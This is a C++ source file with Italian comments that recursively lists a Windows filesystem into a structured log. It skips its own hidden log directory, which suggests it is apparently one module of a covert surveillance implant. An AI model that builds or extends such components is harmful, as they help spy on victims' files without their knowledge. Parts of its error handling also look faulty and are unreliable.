#include "Explorer.h"
#include <wchar.h>

#include "FunctionFunc.h"

Explorer::Explorer() {
	if (log.CreateLog(LOGTYPE_FILESYSTEM, NULL, 0, FLASH) == FALSE) {
		DBG_TRACE(L"Debug - Explorer.cpp - Explorer() Cannot create log file\n", 6, FALSE);
	}
}

Explorer::~Explorer() {
	log.CloseLog(log.IsEmpty());
}

WCHAR* Explorer::CompleteDirectoryPath(WCHAR *wStartPath, WCHAR *wFileName, WCHAR *wDestPath) {
	WCHAR *wTerm;

	_snwprintf(wDestPath, MAX_PATH, L"%s", wStartPath);

	if ((wTerm = wcsrchr(wDestPath, L'\\'))) {
		wTerm++;
		*wTerm = NULL;
		_snwprintf(wDestPath, MAX_PATH, L"%s%s", wDestPath, wFileName);	
	} 

	return wDestPath;
}

WCHAR* Explorer::RecurseDirectory(WCHAR *wStartPath, WCHAR *wRecursePath) {
	_snwprintf(wRecursePath, MAX_PATH, L"%s\\*", wStartPath);	
	return wRecursePath;
}

// Ritorna FALSE se la esplora ed e' vuota oppure se non e' valida
BOOL Explorer::ExploreDirectory(WCHAR *wStartPath, DWORD dwDepth) {
	WIN32_FIND_DATAW wfd;
	HANDLE hFind = INVALID_HANDLE_VALUE;
	BOOL bFull = FALSE;
	FilesystemData fsData;
	WCHAR wFilePath[MAX_PATH], wRecursePath[MAX_PATH];
	WCHAR wHiddenPath[MAX_PATH];
	wstring strPath = L"\\*";

	if (wStartPath == NULL) {
		DBG_TRACE(L"Debug - Explorer.cpp - ExploreDirectory() [wStartPath == NULL] ", 5, TRUE);
		return FALSE;
	}

	if (dwDepth == 0)
		return TRUE;

	// Evita il browsing della dir nascosta
	_snwprintf(wHiddenPath, MAX_PATH, L"%s", LOG_DIR_NAME);		

	// Bisogna partire dalla lista dei drive
	if (!wcscmp(wStartPath, L"/")) {
		// Nel caso speciale impostiamo la depth a 2, il primo run
		// trova solo la root "\", il secondo i file nella root.
		dwDepth = 2;

		// Creiamo una root-entry artificiale
		ZeroMemory(&fsData, sizeof(FilesystemData));
		fsData.dwVersion = LOG_FILESYSTEM_VERSION;
		fsData.dwFlags = FILESYSTEM_IS_DIRECTORY;

		strPath = L"\\";

		DBG_TRACE_STR(L"Debug - Explorer.cpp - Logging path: ", strPath.c_str(), 4, FALSE);

		fsData.dwPathLen = strPath.size() * sizeof(WCHAR);

		log.WriteLog((BYTE *)&fsData, sizeof(fsData));
		log.WriteLog((BYTE *)strPath.c_str(), fsData.dwPathLen);

		// Iniziamo la ricerca reale
		ZeroMemory(&wfd, sizeof(wfd));
		hFind = _FindFirstFile(strPath.c_str(), &wfd);

		if (hFind == INVALID_HANDLE_VALUE) {
			DWORD dwErr = GetLastError();

			if (dwErr != ERROR_NO_MORE_FILES) {
				DBG_TRACE_INT(L"Debug - Explorer.cpp - ExploreDirectory() [FindFirstFileW() (1) Failed] Err: ", 5, FALSE, dwErr);
			}

			return FALSE;
		}

		do {
			if (wcsstr(wfd.cFileName, wHiddenPath))
				continue;

			ZeroMemory(&fsData, sizeof(FilesystemData));
			fsData.dwVersion = LOG_FILESYSTEM_VERSION;
			fsData.dwFileSizeHi = wfd.nFileSizeHigh;
			fsData.dwFileSizeLo = wfd.nFileSizeLow;
			fsData.ftTime = wfd.ftLastWriteTime;

			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				fsData.dwFlags |= FILESYSTEM_IS_DIRECTORY;

			strPath = L"\\";
			strPath += wfd.cFileName;

			DBG_TRACE_STR(L"Debug - Explorer.cpp - Logging path: ", strPath.c_str(), 4, FALSE);

			fsData.dwPathLen = strPath.size() * sizeof(WCHAR);

			log.WriteLog((BYTE *)&fsData, sizeof(fsData));
			log.WriteLog((BYTE *)strPath.c_str(), fsData.dwPathLen);

			if (!ExploreDirectory(RecurseDirectory(wfd.cFileName, wRecursePath), dwDepth - 1))
				fsData.dwFlags |= FILESYSTEM_IS_EMPTY;

		} while (FindNextFile(hFind, &wfd));

		FindClose(hFind);
		return TRUE;
	}

	ZeroMemory(&wfd, sizeof(wfd));
	hFind = _FindFirstFile(wStartPath, &wfd);

	if (hFind == INVALID_HANDLE_VALUE) {
		DWORD dwErr = GetLastError();

		if (dwErr != ERROR_NO_MORE_FILES) {
			DBG_TRACE_INT(L"Debug - Explorer.cpp - ExploreDirectory() [FindFirstFileW() (2) Failed] Err: ", 5, FALSE, dwErr);
		}
	}

	do {
		if (wcsstr(wfd.cFileName, wHiddenPath))
			continue;

		bFull = TRUE;
		ZeroMemory(&fsData, sizeof(FilesystemData));
		fsData.dwVersion = LOG_FILESYSTEM_VERSION;
		fsData.dwFileSizeHi = wfd.nFileSizeHigh;
		fsData.dwFileSizeLo = wfd.nFileSizeLow;
		fsData.ftTime = wfd.ftLastWriteTime;

		if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			fsData.dwFlags |= FILESYSTEM_IS_DIRECTORY;

		CompleteDirectoryPath(wStartPath, wfd.cFileName, wFilePath);

		fsData.dwPathLen = WideLen(wFilePath);

		if (fsData.dwFlags & FILESYSTEM_IS_DIRECTORY) 
			if (!ExploreDirectory(RecurseDirectory(wFilePath, wRecursePath), dwDepth - 1))
				fsData.dwFlags |= FILESYSTEM_IS_EMPTY;

		DBG_TRACE_STR(L"Debug - Explorer.cpp - Logging path: ", wFilePath, 4, FALSE);

		log.WriteLog((BYTE *)&fsData, sizeof(fsData));
		log.WriteLog((BYTE *)&wFilePath, fsData.dwPathLen);
	} while (FindNextFileW(hFind, &wfd));

	FindClose(hFind);
	return bFull;
}
